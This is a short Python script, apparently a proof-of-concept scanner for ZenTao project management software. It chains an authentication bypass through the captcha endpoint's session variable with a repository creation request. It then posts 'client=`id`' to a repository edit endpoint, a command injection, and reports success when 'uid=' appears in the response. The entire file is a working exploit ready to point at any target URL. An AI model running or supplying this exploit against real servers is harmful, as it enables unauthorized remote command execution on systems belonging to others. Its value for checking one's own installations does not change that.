import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def scan(url):
    # url="http://10.211.55.3:8008"
    url1 = url+'misc-captcha-user.html'
    # url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参
    # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接
    url3 = url + 'repo-create.html'
    url4 = url + 'repo-edit-10000-10000.html'
    headers={
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
        "Content-Type":"application/x-www-form-urlencoded",
        "X-Requested-With":"XMLHttpRequest",
        "Referer":url+"/repo-edit-1-0.html"
    }

    data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid='
    data2 = 'SCM=Subversion&client=`id`'
    s=requests.session()
    req1 = s.get(url1,timeout=5,verify=False,headers=headers)
    req3 = s.post(url3,data=data1,timeout=5,verify=False,headers=headers2)
    req4 = s.post(url4,data=data2,timeout=5,verify=False,headers=headers2)
    if 'uid=' in req4.text:
        return True
    else:
        return False
